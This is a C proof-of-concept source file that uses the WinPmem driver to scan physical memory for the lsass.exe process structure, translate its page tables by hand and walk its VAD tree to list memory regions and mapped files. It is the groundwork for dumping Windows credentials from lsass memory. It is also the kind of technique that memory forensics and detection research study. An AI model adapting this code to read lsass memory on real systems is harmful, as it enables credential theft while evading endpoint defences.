#include <Windows.h>
#include <stdio.h>
#include "definitions.h"

#pragma warning(disable:4996)



ULONGLONG max_physical_memory = 0;
ULONGLONG start = 0;
ULONGLONG end = 0;
ULONGLONG DirectoryTableBase = 0;
ULONGLONG VadCount = 0;
ULONGLONG VadRootPointer = 0;

BUFF_SIZE = (4096 * 4096);
HANDLE pmem_fd = NULL;

typedef struct {
    CHAR  ImageFileName[15];
} EPROCESS_NEEDLE;



typedef struct{
    ULONGLONG id;
    ULONGLONG vaddress;
    ULONGLONG start;
    ULONGLONG end;
    ULONGLONG size;
    char image[MAX_PATH];
} VAD;





int memmem(PBYTE haystack,
    DWORD haystack_size,
    PBYTE needle,
    DWORD needle_size)
{
    int haystack_offset = 0;
    int needle_offset = 0;

    haystack_size -= needle_size;

    for (haystack_offset = 0; haystack_offset <= haystack_size; haystack_offset++) {
        for (needle_offset = 0; needle_offset < needle_size; needle_offset++)
            if (haystack[haystack_offset + needle_offset] != needle[needle_offset])
                break; // Next character in haystack.

        if (needle_offset == needle_size)
            return haystack_offset;
    }

    return -1;
}

ULONGLONG extractBits(ULONGLONG address, ULONGLONG size, ULONGLONG offset) {
    return (((1 << size) - 1) & (address >> offset));
}

ULONGLONG v2p(ULONGLONG vaddr) {
    BOOL result = FALSE;
    DWORD bytes_read = 0;
    LARGE_INTEGER PML4E;
    LARGE_INTEGER PDPE;
    LARGE_INTEGER PDE;
    LARGE_INTEGER PTE;
    ULONGLONG SIZE = 0;
    ULONGLONG phyaddr = 0;
    ULONGLONG base = 0;

    base = DirectoryTableBase;

    PML4E.QuadPart = base + extractBits(vaddr, 9, 39) * 0x8;
    //printf("[DEBUG Virtual Address: 0x%08llx]\n", vaddr);
    //printf("\t[*] PML4E: 0x%x\n", PML4E.QuadPart);

    result = SetFilePointerEx(pmem_fd, PML4E, NULL, FILE_BEGIN);
    PDPE.QuadPart = 0;
    result = ReadFile(pmem_fd, &PDPE.QuadPart, 7, &bytes_read, NULL);
    PDPE.QuadPart = extractBits(PDPE.QuadPart, 56, 12) * 0x1000 + extractBits(vaddr, 9, 30) * 0x8;
    //printf("\t[*] PDPE: 0x%08llx\n", PDPE.QuadPart);

    result = SetFilePointerEx(pmem_fd, PDPE, NULL, FILE_BEGIN);
    PDE.QuadPart = 0;
    result = ReadFile(pmem_fd, &PDE.QuadPart, 7, &bytes_read, NULL);
    PDE.QuadPart = extractBits(PDE.QuadPart, 56, 12) * 0x1000 + extractBits(vaddr, 9, 21) * 0x8;
    //printf("\t[*] PDE: 0x%08llx\n", PDE.QuadPart);


    result = SetFilePointerEx(pmem_fd, PDE, NULL, FILE_BEGIN);
    PTE.QuadPart = 0;
    result = ReadFile(pmem_fd, &SIZE, 8, &bytes_read, NULL);
    if (extractBits(SIZE, 1, 63) == 1) {
        result = SetFilePointerEx(pmem_fd, PDE, NULL, FILE_BEGIN);
        result = ReadFile(pmem_fd, &phyaddr, 7, &bytes_read, NULL);
        phyaddr = extractBits(phyaddr, 56, 20) * 0x100000 + extractBits(vaddr, 21, 0);
        //printf("\t[*] Physical Address: 0x%08llx\n", phyaddr);
        return phyaddr;

     }


    result = SetFilePointerEx(pmem_fd, PDE, NULL, FILE_BEGIN);
    PTE.QuadPart = 0;
    result = ReadFile(pmem_fd, &PTE.QuadPart, 7, &bytes_read, NULL);
    PTE.QuadPart = extractBits(PTE.QuadPart, 56, 12) * 0x1000 + extractBits(vaddr, 9, 12) * 0x8;
    //printf("\t[*] PTE: 0x%08llx\n", PTE.QuadPart);

    result = SetFilePointerEx(pmem_fd, PTE, NULL, FILE_BEGIN);
    result = ReadFile(pmem_fd, &phyaddr, 7, &bytes_read, NULL);
    phyaddr = extractBits(phyaddr, 56, 12) * 0x1000 + extractBits(vaddr, 12, 0);
    //printf("\t[*] Physical Address: 0x%08llx\n", phyaddr);
    
    return phyaddr;
}


ULONGLONG readPhysMemPointer(LARGE_INTEGER offset) {
    BOOL result = FALSE;
    DWORD bytes_read = 0;
    ULONGLONG buffer = 0;

    result = SetFilePointerEx(pmem_fd, offset, NULL, FILE_BEGIN);
    result = ReadFile(pmem_fd, &buffer, 8, &bytes_read, NULL);

    return buffer;
}

void walkAVL(ULONGLONG VadRoot, ULONGLONG VadCount) {
    ULONGLONG* queue;
    BOOL result;
    DWORD bytes_read = 0;
    LARGE_INTEGER reader;
    ULONGLONG cursor = 0;
    ULONGLONG count = 1;
    ULONGLONG last = 1;

    ULONGLONG startingVpn = 0;
    ULONGLONG endingVpn = 0;
    ULONGLONG startingVpnHigh = 0;
    ULONGLONG endingVpnHigh = 0;
    ULONGLONG start = 0;
    ULONGLONG end = 0;

    VAD* vadList = NULL;

    printf("[+] Starting to walk _RTL_AVL_TREE...\n");
    queue = (ULONGLONG *)malloc(sizeof(ULONGLONG) * VadCount * 4);
    queue[0] = VadRoot; // Node 0

    vadList = (VAD*)malloc(VadCount * sizeof(*vadList));

    while (count <= VadCount) {
        ULONGLONG currentNode;
        ULONGLONG left = 0;
        ULONGLONG right = 0;
        ULONGLONG subsection = 0;
        ULONGLONG control_area = 0;
        ULONGLONG filepointer = 0;
        ULONGLONG fileobject = 0;
        ULONGLONG filename = 0;
        USHORT pathLen = 0;
        LPWSTR path = NULL;

        // printf("Cursor [%lld]\n", cursor);
        currentNode = queue[cursor]; // Current Node, at start it is the VadRoot pointer
        if (currentNode == 0) {
            cursor++;
            continue;
        }

        reader.QuadPart = v2p(currentNode); // Get Physical Address
        left = readPhysMemPointer(reader); //Read 8 bytes and save it as "left" node
        queue[last++] = left; //Add the new node
        //printf("[<] Left: 0x%08llx\n", left);

        reader.QuadPart = v2p(currentNode + 0x8); // Get Physical Address of right node
        right = readPhysMemPointer(reader); //Save the pointer
        queue[last++] = right; //Add the new node
        //printf("[>] Right: 0x%08llx\n", right);
  



        // Get the start address
        reader.QuadPart = v2p(currentNode + 0x18);
        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
        result = ReadFile(pmem_fd, &startingVpn, 4, &bytes_read, NULL);
        reader.QuadPart = v2p(currentNode + 0x20);
        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
        result = ReadFile(pmem_fd, &startingVpnHigh, 1, &bytes_read, NULL);
        start = (startingVpn << 12) | (startingVpnHigh << 44);

        // Get the end address
        reader.QuadPart = v2p(currentNode + 0x1c);
        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
        result = ReadFile(pmem_fd, &endingVpn, 4, &bytes_read, NULL);
        reader.QuadPart = v2p(currentNode + 0x21);
        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
        result = ReadFile(pmem_fd, &endingVpnHigh, 1, &bytes_read, NULL);
        end = (((endingVpn + 1) << 12) | (endingVpnHigh << 44));

        //Get the pointer to Subsection (offset 0x48 of __mmvad)
        reader.QuadPart = v2p(currentNode + 0x48);
        subsection = readPhysMemPointer(reader); 
        
        if (subsection != 0 && subsection != 0xffffffffffffffff) {

            //Get the pointer to ControlArea (offset 0 of _SUBSECTION)
            reader.QuadPart = v2p(subsection);
            control_area = readPhysMemPointer(reader); 

            if (control_area != 0 && control_area != 0xffffffffffffffff) {

                //Get the pointer to FileObject (offset 0x40 of _CONTROL_AREA)
                reader.QuadPart = v2p(control_area + 0x40);
                fileobject = readPhysMemPointer(reader);
                if (fileobject != 0 && fileobject != 0xffffffffffffffff) {
                    // It is an _EX_FAST_REF, so we need to mask the last byte
                    fileobject = fileobject & 0xfffffffffffffff0;

                    //Get the pointer to path length (offset 0x58 of _FILE_OBJECT is _UNICODE_STRING, the len plus null bytes is at +0x2)
                    reader.QuadPart = v2p(fileobject + 0x58 + 0x2);
                    result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
                    result = ReadFile(pmem_fd, &pathLen, 2, &bytes_read, NULL);

                    //Get the pointer to the path name (offset 0x58 of _FILE_OBJECT is _UNICODE_STRING, the pointer to the buffer is +0x08)
                    reader.QuadPart = v2p(fileobject + 0x58 + 0x8);
                    filename = readPhysMemPointer(reader);

                    //Save the path name
                    path = (LPWSTR)malloc(pathLen * sizeof(wchar_t));
                    reader.QuadPart = v2p(filename);
                    result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
                    result = ReadFile(pmem_fd, path, pathLen * 2, &bytes_read, NULL);
                }
            }
        }
        /*printf("[0x%08llx]\n", currentNode);
        printf("[!] Subsection 0x%08llx\n", subsection);
        printf("[!] ControlArea 0x%08llx\n", control_area);
        printf("[!] FileObject 0x%08llx\n", fileobject);
        printf("[!] PathLen %d\n", pathLen);
        printf("[!] Buffer with path name 0x%08llx\n", filename);
        printf("[!] Path name: %S\n", path);
        */

        // Print the info
        //printf("[*] Node number (%lld) (0x%08llx) [0x%08llx-0x%08llx] (%lld bytes)\n", count, currentNode, start, end, end - start);


        // Save the info
        vadList[count - 1].id = count - 1;
        vadList[count - 1].vaddress = currentNode;
        vadList[count - 1].start = start;
        vadList[count - 1].end = end;
        vadList[count - 1].size = end - start;
        memset(vadList[count - 1].image, 0, MAX_PATH);
        if (path != NULL) {
            wcstombs(vadList[count - 1].image, path, MAX_PATH);
            free(path);
        } 

        count++;
        cursor++;
    }
    printf("\t\t===================[VAD info]===================\n");
    for (int i = 0; i < VadCount; i++) {
        printf("[%lld] (0x%08llx) [0x%08llx-0x%08llx] (%lld bytes)\n", vadList[i].id, vadList[i].vaddress, vadList[i].start, vadList[i].end, vadList[i].size);
        if (vadList[i].image[0] != 0) {
            printf(" |\n +---->> %s\n", vadList[i].image);
        }
    }
    printf("\t\t================================================\n");
    free(vadList);
    free(queue);
    return;
    
}



int main(int argc, char** argv) {
    WINPMEM_MEMORY_INFO info;
    DWORD size;
    BOOL result = FALSE;
    int i = 0;
    LARGE_INTEGER large_start;
    DWORD found = 0;


    printf("[+] Getting WinPmem handle...\t");
    pmem_fd = CreateFileA("\\\\.\\pmem",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (pmem_fd == INVALID_HANDLE_VALUE) {
        printf("ERROR!\n");
        return -1;
    }
    printf("OK!\n");

    RtlZeroMemory(&info, sizeof(WINPMEM_MEMORY_INFO));
    printf("[+] Getting memory info...\t");
    result = DeviceIoControl(pmem_fd, IOCTL_GET_INFO,
        NULL, 0, // in
        (char*)&info, sizeof(WINPMEM_MEMORY_INFO), // out
        &size, NULL);
    if (!result) {
        printf("ERROR!\n");
        return -1;
    }
    printf("OK!\n");

    printf("[+] Memory Info:\n");
    printf("\t[-] Total ranges: %lld\n", info.NumberOfRuns.QuadPart);
    for (i = 0; i < info.NumberOfRuns.QuadPart; i++) {
        printf("\t\tStart 0x%08llX - Length 0x%08llx\n", info.Run[i].BaseAddress.QuadPart, info.Run[i].NumberOfBytes.QuadPart);
        max_physical_memory = info.Run[i].BaseAddress.QuadPart + info.Run[i].NumberOfBytes.QuadPart;
    }
    printf("\t[-] Max physical memory 0x%08llx\n", max_physical_memory);

    printf("[+] Scanning memory... ");
    
   
    for (i = 0; i < info.NumberOfRuns.QuadPart; i++) {
        start = info.Run[i].BaseAddress.QuadPart;
        end = info.Run[i].BaseAddress.QuadPart + info.Run[i].NumberOfBytes.QuadPart;

        while (start < end) {
            unsigned char* largebuffer = (unsigned char*)malloc(BUFF_SIZE);
            DWORD to_write = (DWORD)min((BUFF_SIZE), end - start);
            DWORD bytes_read = 0;
            DWORD bytes_written = 0;
            large_start.QuadPart = start;
            result = SetFilePointerEx(pmem_fd, large_start, NULL, FILE_BEGIN);
            if (!result) {
                printf("[!] ERROR! (SetFilePointerEx)\n");
            }
            result = ReadFile(pmem_fd, largebuffer, to_write, &bytes_read, NULL);
            EPROCESS_NEEDLE needle_root_process = {"lsass.exe"};
            

            PBYTE needle_buffer = (PBYTE)malloc(sizeof(EPROCESS_NEEDLE));
            memcpy(needle_buffer, &needle_root_process, sizeof(EPROCESS_NEEDLE));
            int offset = 0;
            offset = memmem((PBYTE)largebuffer, bytes_read, needle_buffer, sizeof(EPROCESS_NEEDLE));
            if (offset >= 0) {
                if (largebuffer[offset + 15] == 2) { //Priority Check
                    if (largebuffer[offset - 0x168] == 0x88 && largebuffer[offset - 0x167] == 0x02) { //PID check, hardcoded for PoC
                        printf("signature match at 0x%08llx!\n", offset + start);
                        printf("[+] EPROCESS is at 0x%08llx [PHYSICAL]\n", offset - 0x5a8 + start);
                        memcpy(&DirectoryTableBase, largebuffer + offset - 0x5a8 + 0x28, sizeof(ULONGLONG));
                        printf("\t[*] DirectoryTableBase: 0x%08llx\n", DirectoryTableBase);
                        printf("\t[*] VadRoot is at 0x%08llx [PHYSICAL]\n", start + offset - 0x5a8 + 0x7d8);
                        memcpy(&VadRootPointer, largebuffer + offset - 0x5a8 + 0x7d8, sizeof(ULONGLONG));
                        VadRootPointer = VadRootPointer;
                        printf("\t[*] VadRoot points to 0x%08llx [VIRTUAL]\n", VadRootPointer);
                        memcpy(&VadCount, largebuffer + offset - 0x5a8 + 0x7e8, sizeof(ULONGLONG));
                        printf("\t[*] VadCount is %lld\n", VadCount);
                        walkAVL(VadRootPointer, VadCount);
                        free(needle_buffer);
                        free(largebuffer);
                        found = 1;
                        break;
                    }
                }
            }

            start += bytes_read;

            free(needle_buffer);
            free(largebuffer);
        }
        if (found != 0) {
            break;
        }
    }
    
	return 0;
}

